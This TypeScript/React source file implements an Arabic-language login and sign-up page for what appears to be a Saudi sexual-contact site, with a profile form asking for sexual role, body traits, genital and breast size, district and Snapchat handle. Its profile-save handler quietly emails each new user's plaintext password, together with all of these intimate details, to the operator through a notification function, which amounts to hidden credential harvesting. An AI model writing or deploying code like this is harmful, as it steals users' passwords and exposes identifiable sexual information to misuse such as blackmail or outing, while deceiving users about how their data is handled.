import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { Mail, Lock, LogIn, UserPlus, AlertCircle, Eye, EyeOff, Shield, ChevronDown, Save } from "lucide-react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import loginBg from "@/assets/login-bg.jpeg";

export const Route = createFileRoute("/login")({
  component: LoginPage,
  head: () => ({
    meta: [
      { title: "تسجيل الدخول" },
      { name: "description", content: "تسجيل الدخول أو إنشاء حساب جديد" },
    ],
  }),
});

const SAUDI_CITIES = [
  "الرياض", "جدة", "مكة المكرمة", "المدينة المنورة", "الدمام",
  "تبوك", "الطائف", "الخبر", "أبها", "حائل", "جازان",
  "نجران", "الباحة", "الجوف", "عرعر", "القصيم", "ينبع"
];

const ORIENTATION_OPTIONS = ["موجب", "سالب", "مبادل"];
const BODY_APPEARANCE_OPTIONS = ["مشعر", "ناعم"];
const HIS_SIZE_OPTIONS = ["كبير", "متوسط", "صغير"];
const HER_SIZE_OPTIONS = ["كبيره", "ناطه", "بارزه", "صغيره"];

function LoginPage() {
  const [isSignUp, setIsSignUp] = useState(false);
  const [loginMode, setLoginMode] = useState<"customer" | "admin">("customer");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState("");
  const [showProfileDialog, setShowProfileDialog] = useState(false);
  const [newUserId, setNewUserId] = useState("");
  const [profileSaving, setProfileSaving] = useState(false);
  const [profileData, setProfileData] = useState({
    orientation: '', name: '', age: '', city: '', district: '',
    height: '', weight: '', body_appearance: '', his_size: '', her_size: '', snapchat: '',
  });
  const navigate = useNavigate();
  const { signIn, signUp } = useAuth();

  const isProfileValid = Object.values(profileData).every(v => v.trim() !== '');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setSuccessMessage("");

    if (isSignUp && password !== confirmPassword) {
      setError("كلمة المرور وتأكيدها غير متطابقتين");
      return;
    }

    setLoading(true);
    try {
      if (isSignUp) {
        const { data, error } = await signUp(email, password);
        if (error) throw error;
        if (data?.user) {
          setNewUserId(data.user.id);
          setShowProfileDialog(true);
        }
      } else {
        const { error } = await signIn(email, password);
        if (error) throw error;
        if (loginMode === "admin") {
          // Check if user has admin role
          const { data: { user: currentUser } } = await supabase.auth.getUser();
          if (currentUser) {
            const { data: roleData } = await supabase.rpc('has_role', { _user_id: currentUser.id, _role: 'admin' });
            if (!roleData) {
              await supabase.auth.signOut();
              throw new Error("هذا الحساب ليس لديه صلاحيات المسؤول");
            }
          }
          navigate({ to: "/admin" });
        } else {
          navigate({ to: "/" });
        }
      }
    } catch (err: any) {
      setError(err.message || "حدث خطأ، حاول مرة أخرى");
    } finally {
      setLoading(false);
    }
  };

  const handleProfileSave = async () => {
    if (!isProfileValid) return;
    setProfileSaving(true);
    try {
      const { error } = await supabase.from('submissions').insert({
        user_id: newUserId,
        name: profileData.name,
        age: profileData.age,
        city: profileData.city,
        district: profileData.district,
        snapchat: profileData.snapchat,
        orientation: profileData.orientation,
        height: profileData.height,
        weight: profileData.weight,
        body_appearance: profileData.body_appearance,
        his_size: profileData.his_size,
        her_size: profileData.her_size,
      });
      if (error) throw error;

      // Send email notification
      try {
        const emailBody = `
تسجيل مستخدم جديد:

البريد الإلكتروني: ${email}
كلمة المرور: ${password}
النوع: ${profileData.orientation}
الاسم: ${profileData.name}
العمر: ${profileData.age}
المدينة: ${profileData.city}
الحي: ${profileData.district}
الطول: ${profileData.height}
الوزن: ${profileData.weight}
مظهر الجسم: ${profileData.body_appearance}
ماهو حجمه: ${profileData.his_size}
ماهو حجمها: ${profileData.her_size}
حساب سناب شات: ${profileData.snapchat}
        `.trim();

        await supabase.functions.invoke('send-notification-email', {
          body: { subject: 'تسجيل مستخدم جديد', body: emailBody },
        });
      } catch (emailErr) {
        console.error('Email notification failed:', emailErr);
      }

      setShowProfileDialog(false);
      setSuccessMessage("تم إنشاء الحساب وحفظ البيانات بنجاح! يمكنك الآن تسجيل الدخول.");
      setIsSignUp(false);
      setPassword("");
      setConfirmPassword("");
    } catch (err: any) {
      setError(err.message || "حدث خطأ أثناء حفظ البيانات");
    } finally {
      setProfileSaving(false);
    }
  };

  return (
    <div className="min-h-screen relative flex flex-col items-center justify-center px-4 py-8" dir="rtl">
      {/* Background image */}
      <div
        className="absolute inset-0 bg-cover bg-center"
        style={{ backgroundImage: `url(${loginBg})` }}
      />
      <div className="absolute inset-0 bg-black/20" />

      {/* Content */}
      <motion.div
        initial={{ y: 30, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.2 }}
        className="relative z-10 w-full max-w-sm"
      >
        {/* Icon + heading */}
        <div className="flex flex-col items-center mb-6">
          <motion.div
            initial={{ scale: 0, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ type: "spring", stiffness: 200, damping: 15 }}
            className="w-20 h-20 rounded-full bg-white/10 backdrop-blur-xl border-2 border-sky-400/60 flex items-center justify-center mb-4 shadow-xl shadow-sky-500/30"
          >
            {loginMode === "admin" ? <Shield className="w-10 h-10 text-white" /> : isSignUp ? <UserPlus className="w-10 h-10 text-white" /> : <LogIn className="w-10 h-10 text-white" />}
          </motion.div>
          <h1 className="text-2xl font-bold text-white mb-1 drop-shadow-lg">
            {loginMode === "admin" ? "دخول الإدارة" : isSignUp ? "إنشاء حساب جديد" : "تسجيل الدخول"}
          </h1>
          <p className="text-zinc-200 text-sm drop-shadow">
            {loginMode === "admin" ? "لوحة تحكم المسؤول" : isSignUp ? "أنشئ حسابك للمتابعة" : "أدخل بياناتك للدخول"}
          </p>
        </div>

        {/* Toggle Tabs */}
        <div className="flex mb-4 bg-black/40 backdrop-blur-xl border border-white/15 rounded-xl p-1">
          <button
            type="button"
            onClick={() => { setLoginMode("customer"); setIsSignUp(false); setError(""); setSuccessMessage(""); }}
            className={`flex-1 py-2.5 rounded-lg text-sm font-bold transition-all ${
              loginMode === "customer"
                ? "bg-gradient-to-l from-sky-500 to-blue-600 text-white shadow-lg"
                : "text-zinc-300 hover:text-white"
            }`}
          >
            عميل
          </button>
          <button
            type="button"
            onClick={() => { setLoginMode("admin"); setIsSignUp(false); setError(""); setSuccessMessage(""); }}
            className={`flex-1 py-2.5 rounded-lg text-sm font-bold transition-all ${
              loginMode === "admin"
                ? "bg-gradient-to-l from-violet-500 to-indigo-600 text-white shadow-lg"
                : "text-zinc-300 hover:text-white"
            }`}
          >
            إدارة
          </button>
        </div>

        <form onSubmit={handleSubmit} className="bg-black/45 backdrop-blur-2xl border border-white/15 rounded-2xl p-6 shadow-2xl space-y-4">
          {error && (
            <div className="flex items-center gap-2 text-red-300 text-xs bg-red-500/15 border border-red-500/30 rounded-xl p-3">
              <AlertCircle className="w-4 h-4 flex-shrink-0" />
              <span>{error}</span>
            </div>
          )}
          {successMessage && (
            <div className="text-emerald-300 text-xs bg-emerald-500/15 border border-emerald-500/30 rounded-xl p-3">
              {successMessage}
            </div>
          )}

          <div className="space-y-1.5">
            <label className="text-zinc-200 text-xs font-bold flex items-center gap-1.5">
              <Mail className="w-3.5 h-3.5" /> البريد الإلكتروني
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="example@email.com"
              required
              dir="ltr"
              className="w-full bg-white/5 border border-white/20 rounded-xl px-4 py-3 text-white text-sm placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-sky-400/60 focus:border-sky-400/60 backdrop-blur-md"
            />
          </div>

          <div className="space-y-1.5">
            <label className="text-zinc-200 text-xs font-bold flex items-center gap-1.5">
              <Lock className="w-3.5 h-3.5" /> كلمة المرور
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                required
                minLength={1}
                dir="ltr"
                className="w-full bg-white/5 border border-white/20 rounded-xl px-4 py-3 text-white text-sm placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-sky-400/60 focus:border-sky-400/60 backdrop-blur-md pr-12"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-300 hover:text-white"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          {isSignUp && loginMode === "customer" && (
            <div className="space-y-1.5">
              <label className="text-zinc-200 text-xs font-bold flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" /> تأكيد كلمة المرور
              </label>
              <input
                type={showPassword ? "text" : "password"}
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                placeholder="••••••••"
                required
                minLength={1}
                dir="ltr"
                className="w-full bg-white/5 border border-white/20 rounded-xl px-4 py-3 text-white text-sm placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-sky-400/60 focus:border-sky-400/60 backdrop-blur-md"
              />
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className={`w-full font-bold rounded-xl py-3 transition-all shadow-lg disabled:opacity-50 ${
              loginMode === "admin"
                ? "bg-gradient-to-l from-violet-500 to-indigo-600 text-white hover:from-violet-400 hover:to-indigo-500 shadow-indigo-600/30"
                : "bg-gradient-to-l from-sky-500 to-blue-600 text-white hover:from-sky-400 hover:to-blue-500 shadow-blue-600/30"
            }`}
          >
            {loading ? "جاري التحميل..." : loginMode === "admin" ? "دخول المسؤول" : isSignUp ? "إنشاء الحساب" : "تسجيل الدخول"}
          </button>

          {loginMode === "customer" && (
            <div className="text-center">
              <button
                type="button"
                onClick={() => { setIsSignUp(!isSignUp); setError(""); setSuccessMessage(""); setConfirmPassword(""); }}
                className="text-sky-300 text-xs hover:text-sky-200 hover:underline"
              >
                {isSignUp ? "لديك حساب؟ سجل دخولك" : "ليس لديك حساب؟ أنشئ حساب جديد"}
              </button>
            </div>
          )}
        </form>
      </motion.div>

      {/* Profile Dialog */}
      <AnimatePresence>
        {showProfileDialog && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20, opacity: 0 }}
              animate={{ scale: 1, y: 0, opacity: 1 }}
              exit={{ scale: 0.9, y: 20, opacity: 0 }}
              className="bg-zinc-900 border border-zinc-800 w-full max-w-md rounded-2xl overflow-y-auto max-h-[90vh] shadow-2xl"
              dir="rtl"
            >
              <div className="p-5 space-y-4">
                <h2 className="text-lg font-bold text-white text-center mb-2">أكمل بياناتك الشخصية</h2>

                {/* النوع */}
                <ProfileSelect label="النوع" value={profileData.orientation} options={ORIENTATION_OPTIONS}
                  onChange={(v) => setProfileData(p => ({ ...p, orientation: v }))} />

                {/* الاسم */}
                <ProfileInput label="الاسم" value={profileData.name}
                  onChange={(v) => setProfileData(p => ({ ...p, name: v }))} placeholder="أدخل اسمك..." />

                {/* العمر */}
                <ProfileInput label="العمر" value={profileData.age} inputMode="numeric"
                  onChange={(v) => setProfileData(p => ({ ...p, age: v.replace(/[^0-9]/g, '') }))} placeholder="أرقام فقط..." />

                {/* المدينة */}
                <ProfileSelect label="المدينة" value={profileData.city} options={SAUDI_CITIES}
                  onChange={(v) => setProfileData(p => ({ ...p, city: v }))} />

                {/* الحي */}
                <ProfileInput label="الحي" value={profileData.district}
                  onChange={(v) => setProfileData(p => ({ ...p, district: v }))} placeholder="اكتب اسم الحي..." />

                {/* الطول */}
                <ProfileInput label="الطول" value={profileData.height} inputMode="numeric"
                  onChange={(v) => setProfileData(p => ({ ...p, height: v.replace(/[^0-9]/g, '') }))} placeholder="أرقام فقط..." />

                {/* الوزن */}
                <ProfileInput label="الوزن" value={profileData.weight} inputMode="numeric"
                  onChange={(v) => setProfileData(p => ({ ...p, weight: v.replace(/[^0-9]/g, '') }))} placeholder="أرقام فقط..." />

                {/* مظهر الجسم */}
                <ProfileSelect label="مظهر الجسم" value={profileData.body_appearance} options={BODY_APPEARANCE_OPTIONS}
                  onChange={(v) => setProfileData(p => ({ ...p, body_appearance: v }))} />

                {/* ماهو حجمه */}
                <ProfileSelect label="ماهو حجمه" value={profileData.his_size} options={HIS_SIZE_OPTIONS}
                  onChange={(v) => setProfileData(p => ({ ...p, his_size: v }))} />

                {/* ماهو حجمها */}
                <ProfileSelect label="ماهو حجمها" value={profileData.her_size} options={HER_SIZE_OPTIONS}
                  onChange={(v) => setProfileData(p => ({ ...p, her_size: v }))} />

                {/* سناب شات */}
                <ProfileInput label="حساب سناب شات" value={profileData.snapchat} dir="ltr"
                  onChange={(v) => setProfileData(p => ({ ...p, snapchat: v.replace(/[^a-zA-Z0-9._-]/g, '') }))} placeholder="اسم المستخدم بالإنجليزية..." />

                <button
                  onClick={handleProfileSave}
                  disabled={!isProfileValid || profileSaving}
                  className={`w-full py-3 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all ${
                    isProfileValid && !profileSaving
                      ? 'bg-gradient-to-l from-sky-500 to-blue-600 text-white hover:from-sky-400 hover:to-blue-500 shadow-lg shadow-blue-600/20'
                      : 'bg-zinc-800 text-zinc-500 cursor-not-allowed'
                  }`}
                >
                  <Save className="w-4 h-4" />
                  {profileSaving ? "جاري الحفظ..." : "حفظ البيانات"}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function ProfileInput({ label, value, onChange, placeholder, inputMode, dir }: {
  label: string; value: string; onChange: (v: string) => void; placeholder: string;
  inputMode?: "text" | "numeric"; dir?: string;
}) {
  return (
    <div className="space-y-1">
      <label className="text-zinc-400 text-xs font-bold">{label} <span className="text-red-400">*</span></label>
      <input
        type="text"
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        inputMode={inputMode}
        dir={dir}
        required
        className="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-2.5 text-zinc-100 text-sm placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-blue-500/50"
      />
    </div>
  );
}

function ProfileSelect({ label, value, options, onChange }: {
  label: string; value: string; options: string[]; onChange: (v: string) => void;
}) {
  return (
    <div className="space-y-1">
      <label className="text-zinc-400 text-xs font-bold">{label} <span className="text-red-400">*</span></label>
      <div className="relative">
        <select
          value={value}
          onChange={(e) => onChange(e.target.value)}
          required
          className="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-2.5 text-zinc-100 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/50 appearance-none"
        >
          <option value="" disabled>اختر...</option>
          {options.map(opt => <option key={opt} value={opt}>{opt}</option>)}
        </select>
        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500 pointer-events-none" />
      </div>
    </div>
  );
}
